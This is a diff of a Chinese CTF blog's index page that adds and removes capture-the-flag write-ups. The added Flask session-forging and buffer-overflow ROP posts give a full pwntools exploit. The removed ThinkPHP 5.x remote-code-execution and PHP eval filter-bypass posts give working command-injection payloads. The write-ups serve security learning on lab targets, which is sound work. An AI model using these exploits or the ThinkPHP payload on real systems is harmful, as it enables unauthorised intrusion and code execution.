@@ -131,6 +131,103 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/08/19/HS2019-storytime-wp/" >nightmare 2.15.HS2019-storytime-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-08-19
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/08-bof_dynamic/hs19_storytime">相关资源</a>  </p>
+<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>文件夹包含<code>libc.so.6</code>，关于替换动态链接库，可见 <a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/05/30/change_libc/">https://antel0p3.github.io/2023/05/30/change_libc/</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ checksec storytime</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">$ ./storytime</span><br><span class="line">HSCTF PWNNNNNNNNNNNNNNNNNNNN</span><br><span class="line">Tell me a story:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;HSCTF PWNNNNNNNNNNNNNNNNNNNN\n&quot;</span>, <span class="number">0x1D</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Tell me a story: \n&quot;</span>, <span class="number">0x12</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x190</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>明显存在栈溢出</p>
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><ol>
+<li><p>通过调用<code>write@plt</code>（第二个参数为<code>write@got</code>）来泄露write实际地址进而获取libc基地址，输出后跳转回main待后续攻击</p>
+<p>注意通常只有<strong>程序执行过</strong>的库函数会出现在plt和got中，所以不能直接用<code>puts</code>来输出</p>
+</li>
+<li><p>找到<code>one_gadget</code>或构造system pop链，获取shell</p>
+<p>one_gadget安装使用：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ apt install ruby</span><br><span class="line">$ gem install one_gadget</span><br><span class="line"></span><br><span class="line">$ one_gadget libc.so.6</span><br><span class="line">0x45216 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>
+
+<p>以上得到的地址在满足条件下可以直接执行<code>/bin/sh</code>，可以作为跳转地址，都尝试失败后就只能通过system获取shell了</p>
+</li>
+</ol>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./storytime&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">belf = ELF(<span class="string">&quot;./storytime&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    b * 0x40069b</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40048e</span></span><br><span class="line">rdi_ret = <span class="number">0x400703</span></span><br><span class="line">rsi_r15_ret = <span class="number">0x400701</span></span><br><span class="line">rax_ret = <span class="number">0x33544</span></span><br><span class="line">main = <span class="number">0x40062E</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x38</span>		<span class="comment"># 填充到ret address</span></span><br><span class="line">payload += p64(rdi_ret) + p64(<span class="number">1</span>) 	<span class="comment"># write(1, write@got, xxx)   第三个参数因为本身就大于write地址长度，可以不管</span></span><br><span class="line">payload += p64(rsi_r15_ret) + p64(belf.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(belf.plt[<span class="string">&#x27;write&#x27;</span>]) + p64(main)		<span class="comment"># 跳转回main</span></span><br><span class="line">sla(<span class="string">b&#x27;story:&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># 获取libc base</span></span><br><span class="line">libc_base = ga() - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x38</span> </span><br><span class="line">payload += p64(libc_base + gadgets[<span class="number">0</span>]) <span class="comment"># 跳转执行gadgets</span></span><br><span class="line">sla(<span class="string">b&#x27;story:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/08/19/HS2019-storytime-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/08/19/LitCTF2023-flagclick-wp/" >LitCTF2023-Flag点击就送-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-08-19
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3872">题目链接</a>  </p>
+<p>题目提示：<code>大型Flag赠送活动开始啦，不过只有管理员才能拿到</code></p>
+<p>进入页面，发现</p>
+<ul>
+<li><code>/hello</code> 	post name&#x3D;xxx		（直接发admin不行，尝试其他字符串都是直接不变输出）</li>
+<li><code>/flag</code>（拿flag按键跳转）       获取flag（仅admin可以）</li>
+</ul>
+<p>发现上传name后有个session值，类似base64</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/19/LitCTF2023-flagclick-wp/0x1.png?raw=true" alt="m"></p>
+<p>解码后得到</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;a&quot;</span>&#125;dàt@¸WÞ$ÊaÞ%mËv6ÙpD	<span class="comment"># 前半部分是上传的name，后面应该是数据签名</span></span><br></pre></td></tr></table></figure>
+
+<p>推测可能是 <strong>flask session伪造</strong></p>
+<p>再查看页面信息确实是flask</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/19/LitCTF2023-flagclick-wp/0x2.png?raw=true" alt="m"></p>
+<h2 id="session伪造"><a href="#session伪造" class="headerlink" title="session伪造"></a>session伪造</h2><p>工具 <a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
+<p>使用方法</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python2 flask-session-cookie-manager2.py decode -c <span class="string">&quot;session值&quot;</span> (-s <span class="string">&quot;key值&quot;</span>)</span><br><span class="line">python2 flask-session-cookie-manager2.py encode -s <span class="string">&quot;key值&quot;</span> -t <span class="string">&quot;我们需要伪造的值&quot;</span></span><br><span class="line">python3 flask-session-cookie-manager3.py decode -c <span class="string">&quot;session值&quot;</span> (-s <span class="string">&quot;key值&quot;</span>)</span><br><span class="line">python3 flask-session-cookie-manager3.py encode -s <span class="string">&quot;key值&quot;</span> -t <span class="string">&quot;我们需要伪造的值&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>伪造需要key，猜测为”LitCTF”</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask-session-cookie-manager3.py encode -s <span class="string">&#x27;LitCTF&#x27;</span> -t <span class="string">&#x27;&#123;&quot;name&quot;:&quot;admin&quot;&#125;&#x27;</span></span><br><span class="line"><span class="comment"># eyJuYW1lIjoiYWRtaW4ifQ.ZOBwTg.fCkX986VBbFDKMaipQ5QjHJAkQg</span></span><br></pre></td></tr></table></figure>
+
+<p>此时再访问<code>/flag</code>，将当前页面cookie改为伪造的值，刷新页面即可看到flag</p>
+
+	
+	</div>
+  <a type="button" href="/2023/08/19/LitCTF2023-flagclick-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/08/19/LitCTF2023-1zjs-wp/" >LitCTF2023-1zjs-wp</a>
 								</h3>
 							</div>
@@ -622,85 +719,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/27/SWPUCTF2022-ezrce-wp/" >SWPUCTF2022-ezrce-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-27
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2826">题目链接</a>  </p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>页面打开为空</p>
-<p>访问<code>robots.txt</code> 有</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br><span class="line">  -  /NSS/index.php/</span><br></pre></td></tr></table></figure>
-
-<p>访问<code>/NSS/index.php/</code> ，页面显示</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">:)</span><br><span class="line"></span><br><span class="line">ThinkPHP V5</span><br><span class="line">十年磨一剑 - 为API开发设计的高性能框架</span><br><span class="line">[ V5.<span class="number">0</span> 版本由 七牛云 独家赞助发布 ]</span><br><span class="line"></span><br><span class="line">好熟悉的界面 似曾相识啊</span><br></pre></td></tr></table></figure>
-
-<p>可见系统使用<code>ThinkPHP v5.0</code></p>
-<h3 id="查询已知漏洞及攻击方式"><a href="#查询已知漏洞及攻击方式" class="headerlink" title="查询已知漏洞及攻击方式"></a>查询已知漏洞及攻击方式</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit thinkphp</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                |  Path</span><br><span class="line">-------------------------------------------------------------- ---------------------------------</span><br><span class="line">ThinkPHP - Multiple PHP Injection RCEs (Metasploit)           | linux/remote/48333.rb</span><br><span class="line">ThinkPHP 2.0 - <span class="string">&#x27;index.php&#x27;</span> Cross-Site Scripting               | php/webapps/33933.txt</span><br><span class="line">ThinkPHP 5.0.23/5.1.31 - Remote Code Execution                | php/webapps/45978.txt		<span class="comment"># 选择这个</span></span><br><span class="line">ThinkPHP 5.X - Remote Command Execution                       | php/webapps/46150.txt</span><br><span class="line">-------------------------------------------------------------- ---------------------------------</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit -p 45978.txt		<span class="comment"># -p 上面Path中的文件名</span></span><br><span class="line"></span><br><span class="line">Exploit: ThinkPHP 5.0.23/5.1.31 - Remote Code Execution</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/45978</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/45978.txt</span><br><span class="line">    Codes: N/A</span><br><span class="line"> Verified: False</span><br><span class="line">File Type: ASCII text</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /usr/share/exploitdb/exploits/php/webapps/45978.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: ThinkPHP 5.x &lt; v5.0.23,v5.1.31 Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 2018-12-11</span></span><br><span class="line"><span class="comment"># Exploit Author: VulnSpy</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://thinkphp.cn</span></span><br><span class="line"><span class="comment"># Software Link: https://github.com/top-think/framework/</span></span><br><span class="line"><span class="comment"># Version: v5.x below v5.0.23,v5.1.31</span></span><br><span class="line"><span class="comment"># CVE: N/A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit</span></span><br><span class="line">http://server/public/index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20<span class="string">&#x27;phpinfo();&#x27;</span>		<span class="comment"># 明显第二个参数即为执行的命令</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?s=/index/\think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">ls</span> /</span></span><br><span class="line"><span class="function">?<span class="title">s</span>=/<span class="title">index</span>/\<span class="title">think</span>\<span class="title">app</span>/<span class="title">invokefunction</span>&amp;<span class="title">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">cat</span> $(<span class="params">find / -name flag</span>)</span></span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/07/27/SWPUCTF2022-ezrce-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/26/UUCTF2022-ez-rce-wp/" >UUCTF2022-ez_rce-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-26
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3090">题目链接</a>   </p>
-<p>页面内容</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">居然都不输入参数，可恶!!!!!!!!!</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;看看你输入的参数！！！不叫样子！！&#x27;</span>;<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你想干什么？？？？？？？？？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;居然都不输入参数，可恶!!!!!!!!!&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>绕过检测即可执行命令</p>
-<p><code>printf</code>和<code>var_dump</code>没有被过滤	其他命令可以用<code>\</code>或中间插入<code>&#39;&#39;</code>绕过</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">printf</span>(`l\s`);</span><br><span class="line">?code=<span class="title function_ invoke__">printf</span>(`l\s;c<span class="string">&#x27;&#x27;</span>at /fffffffffflagafag`)</span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/07/26/UUCTF2022-ez-rce-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -754,7 +772,7 @@
 		
 			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
 		
-			<li><a href="/categories/pwn-wp/">pwn-wp<span>18</span></a></li>
+			<li><a href="/categories/pwn-wp/">pwn-wp<span>19</span></a></li>
 		
 			<li><a href="/categories/reverse-learning/">reverse-learning<span>1</span></a></li>
 		
@@ -762,7 +780,7 @@
 		
 			<li><a href="/categories/web-learning/">web-learning<span>4</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>43</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>45</span></a></li>
 		
 		</ul>
 	</div>
@@ -773,48 +791,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
+			<li><a href="/tags/pesudoProtocol/">pesudoProtocol<span>2</span></a></li>
 		
-			<li><a href="/tags/无字母命令执行/">无字母命令执行<span>1</span></a></li>
+			<li><a href="/tags/fmt-str/">fmt_str<span>2</span></a></li>
 		
-			<li><a href="/tags/unserialize/">unserialize<span>8</span></a></li>
+			<li><a href="/tags/bypass/">bypass<span>5</span></a></li>
+		
+			<li><a href="/tags/ssrf/">ssrf<span>1</span></a></li>
 		
 			<li><a href="/tags/thread/">thread<span>1</span></a></li>
 		
-			<li><a href="/tags/privilege-escalation/">privilege escalation<span>1</span></a></li>
+			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
 		
-			<li><a href="/tags/watevrctf2019/">watevrctf2019<span>1</span></a></li>
+			<li><a href="/tags/canary/">canary<span>3</span></a></li>
 		
-			<li><a href="/tags/sigsegv/">sigsegv<span>1</span></a></li>
-		
-			<li><a href="/tags/HNCTF2022/">HNCTF2022<span>1</span></a></li>
-		
-			<li><a href="/tags/pesudoProtocol/">pesudoProtocol<span>2</span></a></li>
-		
-			<li><a href="/tags/QEMU/">QEMU<span>1</span></a></li>
-		
-			<li><a href="/tags/redis/">redis<span>1</span></a></li>
-		
-			<li><a href="/tags/Backdoorctf2017/">Backdoorctf2017<span>1</span></a></li>
+			<li><a href="/tags/吃瓜杯/">吃瓜杯<span>1</span></a></li>
 		
 			<li><a href="/tags/reverse-shell/">reverse shell<span>1</span></a></li>
 		
-			<li><a href="/tags/CTFSHOW/">CTFSHOW<span>2</span></a></li>
+			<li><a href="/tags/SwampCTF2019/">SwampCTF2019<span>1</span></a></li>
 		
-			<li><a href="/tags/upload/">upload<span>4</span></a></li>
+			<li><a href="/tags/nightmare/">nightmare<span>10</span></a></li>
 		
-			<li><a href="/tags/GKCTF2021/">GKCTF2021<span>1</span></a></li>
+			<li><a href="/tags/malloc-hook/">__malloc_hook<span>1</span></a></li>
 		
-			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
+			<li><a href="/tags/无字母rce/">无字母rce<span>3</span></a></li>
 		
-			<li><a href="/tags/HUBUCTF2022/">HUBUCTF2022<span>1</span></a></li>
+			<li><a href="/tags/dcquals2016/">dcquals2016<span>1</span></a></li>
 		
-			<li><a href="/tags/HDCTF2023/">HDCTF2023<span>1</span></a></li>
+			<li><a href="/tags/path-traversal/">path_traversal<span>1</span></a></li>
 		
-			<li><a href="/tags/web/">web<span>47</span></a></li>
+			<li><a href="/tags/unserialize/">unserialize<span>8</span></a></li>
+		
+			<li><a href="/tags/CTF/">CTF<span>79</span></a></li>
+		
+			<li><a href="/tags/极客大挑战2020/">极客大挑战2020<span>1</span></a></li>
+		
+			<li><a href="/tags/HCTF2018/">HCTF2018<span>1</span></a></li>
+		
+			<li><a href="/tags/fuzz/">fuzz<span>6</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>101</span></a></li>
+		   <li><a href="/tags">...<span>103</span></a></li>
 		 
 		</ul>
 	</div>
@@ -827,6 +845,14 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/10/13/HNCTF2022-easyInclude-wp/" ><i class="fa fa-file-o"></i>HNCTF2022-easy_include-wp</a>
+      </li>
+    
+      <li>
+        <a href="/2023/10/10/dcquals2019-speedrun-wp/" ><i class="fa fa-file-o"></i>nightmare 7.2.1.dcquals2019...</a>
+      </li>
+    
+      <li>
         <a href="/2023/10/10/极客大挑战2020-rceme-wp/" ><i class="fa fa-file-o"></i>极客大挑战2020-rceme-wp</a>
       </li>
     
@@ -836,14 +862,6 @@
     
       <li>
         <a href="/2023/09/29/StarCTF2018-note-wp/" ><i class="fa fa-file-o"></i>StarCTF2018-note-wp</a>
-      </li>
-    
-      <li>
